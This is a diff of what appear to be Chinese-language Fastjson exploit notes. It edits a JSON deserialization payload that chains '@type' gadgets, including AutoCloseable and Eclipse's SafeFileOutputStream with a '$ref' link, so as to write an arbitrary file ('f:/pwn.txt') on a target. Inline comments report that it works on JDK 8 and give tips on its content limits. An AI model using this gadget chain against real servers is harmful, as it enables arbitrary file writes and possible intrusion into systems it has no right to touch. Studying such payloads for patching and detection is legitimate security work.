@@ -732,13 +732,13 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
 ```
 
 jdk 8 成功   
-**不过存在特殊字符影响写入内容。。。。**
+**不过存在特殊字符影响写入内容。。。。？？？**
 ```json
 {
     "stream": {
         "@type": "java.lang.AutoCloseable",
         "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
-        "targetPath": "f:/test/pwn.txt",
+        "targetPath": "f:/pwn.txt",
         "tempPath": ""
     },
     "writer": {
@@ -748,7 +748,7 @@ jdk 8 成功
         "outputStream": {
             "$ref": "$.stream"
         },
-        "position": 5
+        "position": 5  #写入的base64内容字符必须一样。。。
     },
     "close": {
         "@type": "java.lang.AutoCloseable",
